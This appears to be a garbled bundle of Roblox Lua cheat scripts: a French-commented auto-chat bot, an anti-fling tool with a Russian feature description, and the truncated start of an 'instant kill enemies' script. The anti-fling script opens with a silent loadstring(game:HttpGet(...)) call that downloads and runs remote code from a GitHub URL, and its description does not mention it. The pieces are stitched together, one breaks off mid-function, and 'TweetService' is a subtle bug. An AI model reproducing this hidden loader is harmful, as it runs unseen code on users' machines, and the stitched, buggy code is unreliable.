-- =============================================================================
-- FONCTIONS UTILITAIRES & SÉCURITÉS
-- =============================================================================
local function corner(instance, radius)
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, radius)
    UICorner.Parent = instance
    return UICorner
end

local function stroke(instance, color, thickness, transparency)
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = color
    UIStroke.Thickness = thickness
    UIStroke.Transparency = transparency or 0
    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke.Parent = instance
    return UIStroke
end

local function tween(instance, properties, duration, style)
    if not instance or not instance.Parent then return end
    duration = duration or 0.15
    style = style or Enum.EasingStyle.Quad
    local info = TweenInfo.new(duration, style, Enum.EasingDirection.Out)
    local t = TweetService:Create(instance, info, properties)
    t:Play()
    return t
end

local function verifyOwner()
    return true, LocalPlayer.Name, "Administrateur"
end

local function isWhitelisted(username)
    if Config.OpenMode then return true end
    if username == LocalPlayer.Name then return true end
    for _, name in pairs(Config.Whitelist) do
        if name:lower() == username:lower() then return true end
    end
    return false
end

local function addToWhitelist(username)
    if not isWhitelisted(username) then
        table.insert(Config.Whitelist, username)
    end
end

local function removeFromWhitelist(username)
    for i, name in pairs(Config.Whitelist) do
        if name:lower() == username:lower() then
            table.remove(Config.Whitelist, i)
            break
        end
    end
end

-- ===== Gestion des Messages =====
local function sendChatMessage(message)
    if Config.SilentMode or message == "" then return end
    
    local ok = pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if channel then
                channel:SendAsync(message)
            end
        else
            local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            local sayMessage = chatEvents and chatEvents:FindFirstChild("SayMessageRequest")
            if sayMessage then
                sayMessage:FireServer(message, "All")
            end
        end
    end)
    
    if not ok then
        warn("[Verity] Échec de l'envoi du message.")
    end
end

local function processMessage(sender, message)
    if sender == LocalPlayer then return end
    if not isWhitelisted(sender.Name) and not Config.OpenMode then return end

    local cleanMessage = string.lower(message)
    local senderName = sender.DisplayName or sender.Name
    lastInteractionTime = os.clock()

    if Config.AngryMode then
        for keyword, replies in pairs(AngryChatResponses) do
            if string.find(cleanMessage, keyword, 1, true) then
                local reply = replies[math.random(1, #replies)]
                sendChatMessage(string.gsub(reply, "{player}", senderName))
                return
            end
        end
    end

    for keyword, replies in pairs(ChatResponses) do
        if string.find(cleanMessage, keyword, 1, true) then
            local reply = replies[math.random(1, #replies)]
            sendChatMessage(string.gsub(reply, "{player}", senderName))
            return
        end
    end
end

-- =============================================================================
-- MESSAGES ALÉATOIRES (Boucle Idle)
-- =============================================================================
task.spawn(function()
    while true do
        local waitTime = math.random(Config.IdleIntervalMin, Config.IdleIntervalMax)
        task.wait(waitTime)
        if Config.AutoChatEnabled and (os.clock() - lastInteractionTime) >= waitTime then
            local phraseList = Config.AngryMode and Config.AngryIdleMessages or Config.IdleMessages
            if #phraseList > 0 then
                local phrase = phraseList[math.random(1, #phraseList)]
                sendChatMessage(phrase)
                crypticActive = (Config.AngryMode and phrase == Config.CrypticMessage)
                lastInteractionTime = os.clock()
            end
        end
    end
end)

-- =============================================================================
-- TOUCHES RAPIDES (KEYBINDS)
-- =============================================================================
local KeyAliases = {
    Ctrl = Enum.KeyCode.LeftControl,
    Shift = Enum.KeyCode.LeftShift,
    Alt = Enum.KeyCode.LeftAlt,
    Space = Enum.KeyCode.Space,
}

local function resolveKeyCode(keyName)
    keyName = keyName:gsub("^%s+", ""):gsub("%s+$", "")
    if KeyAliases[keyName] then return KeyAliases[keyName] end
    local ok, code = pcall(function() return Enum.KeyCode[keyName] end)
    if ok and code then return code end
    return nil
end

local ActiveKeybinds = {}

local function registerKeybind(keyName, phrase)
    local code = resolveKeyCode(keyName)
    if code then ActiveKeybinds[code] = phrase return true end
    return false
end

for keyName, phrase in pairs(Config.Keybinds) do registerKeybind(keyName, phrase) end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    local phrase = ActiveKeybinds[input.KeyCode]
    if phrase then task.spawn(function() sendChatMessage(phrase) end) end
end)

scripts.script:
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xkaka228X/Hello_gui/refs/heads/main/Donate%20Menu"))()
    end)
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer
local connections = {}
local isEnabled = true

local DetectionRadius = 25
local MaxSafeVelocity = 80

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiFlingIndicator"
screenGui.ResetOnSpawn = false

local uiParent = pcall(function() return CoreGui.RobloxGui end) and CoreGui or localPlayer:WaitForChild("PlayerGui")
screenGui.Parent = uiParent

local statusLabel = Instance.new("TextButton")
statusLabel.Name = "StatusButton"
statusLabel.Size = UDim2.new(0, 200, 0, 30)
statusLabel.Position = UDim2.new(0, 15, 1, -45)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Anti-Fling & Ring: Enabled"
statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
statusLabel.TextSize = 16
statusLabel.Font = Enum.Font.SourceSansBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = screenGui

local uiStroke = Instance.new("UIStroke")
uiStroke.Thickness = 1.5
uiStroke.Color = Color3.fromRGB(0, 0, 0)
uiStroke.Transparency = 0.3
uiStroke.Parent = statusLabel

local function updateUI()
	if isEnabled then
		statusLabel.Text = "Anti-Fling & Ring: Enabled"
		statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
	else
		statusLabel.Text = "Anti-Fling & Ring: Disabled"
		statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
	end
end

local function setupCharacterCollision(character)
	local function disableCollide(part)
		if isEnabled and part:IsA("BasePart") then
			part.CanCollide = false
		end
	end

	for _, part in ipairs(character:GetChildren()) do
		disableCollide(part)
	end

	local childAddedConn = character.ChildAdded:Connect(disableCollide)

	local steppedConn = RunService.Stepped:Connect(function()
		if isEnabled and character:IsDescendantOf(Workspace) then
			for _, part in ipairs(character:GetChildren()) do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end
	end)

	character.Destroying:Connect(function()
		childAddedConn:Disconnect()
		steppedConn:Disconnect()
	end)
end

local function trackPlayer(player)
	if player == localPlayer then return end
	local charAddedConn = player.CharacterAdded:Connect(setupCharacterCollision)
	if player.Character then
		setupCharacterCollision(player.Character)
	end
	connections[player] = charAddedConn
end

local function untrackPlayer(player)
	if connections[player] then
		connections[player]:Disconnect()
		connections[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	trackPlayer(player)
end

Players.PlayerAdded:Connect(trackPlayer)
Players.PlayerRemoving:Connect(untrackPlayer)

local function SecurePart(part, hrpPosition, myChar)
	if not part:IsA("BasePart") or part.Anchored or part:IsDescendantOf(myChar) then
		return
	end

	local distance = (part.Position - hrpPosition).Magnitude
	if distance <= DetectionRadius then
		local vel = part.AssemblyLinearVelocity.Magnitude
		local rotVel = part.AssemblyAngularVelocity.Magnitude

		if vel > MaxSafeVelocity or rotVel > MaxSafeVelocity then
			part.CanCollide = false
			part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			pcall(function()
				part.CFrame = part.CFrame + Vector3.new(0, 500, 0)
			end)
		end
	end
end

RunService.Heartbeat:Connect(function()
	if not isEnabled then return end

	local myChar = localPlayer.Character
	if not myChar then return end

	local hrp = myChar:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local hrpPos = hrp.Position

	for _, item in ipairs(Workspace:GetChildren()) do
		if item:IsA("BasePart") then
			SecurePart(item, hrpPos, myChar)
		elseif item:IsA("Model") and not Players:GetPlayerFromCharacter(item) then
			for _, part in ipairs(item:GetDescendants()) do
				if part:IsA("BasePart") then
					SecurePart(part, hrpPos, myChar)
				end
			end
		end
	end
end)

statusLabel.MouseButton1Click:Connect(function()
	isEnabled = not isEnabled
	updateUI()
end)

localPlayer.Chatted:Connect(function(msg)
	msg = msg:lower()
	if msg == ";af on" or msg == ";antifling on" then
		isEnabled = true
	elseif msg == ";af off" or msg == ";antifling off" then
		isEnabled = false
	end
	updateUI()
end)
scripts.features:
Простой и оптимизированный анти-флинг скрипт, который вырубает коллизию у других игроков. Твой перс больше не улетит в космос, если в него врежется какой-нибудь софт или чел с крутилкой.
Фишки:
Не лагает — вместо одного тяжелого бесконечного цикла, который насилует FPS, здесь каждый челик обрабатывается отдельно и только тогда, когда это нужно.
Вкл/Выкл прямо в игре — можно просто кликнуть по тексту слева снизу, либо прописать команды в чат: ;af on / ;af off (ну или ;antifling on / ;antifling off).
Без утечек памяти — когда игроки ливают с сервера, скрипт полностью чистит за ними все потоки, так что игра не начнет фризить через полчаса.
Удобный UI — аккуратная аккуратная надпись снизу экрана, которая показывает, работает функция в данный момент или нет.

-- The Battle Bricks - Instant Kill Enemies Only (Simple Panel)

	end
	return nil
end

local function getAllEnemies()

	if enemyFolder then
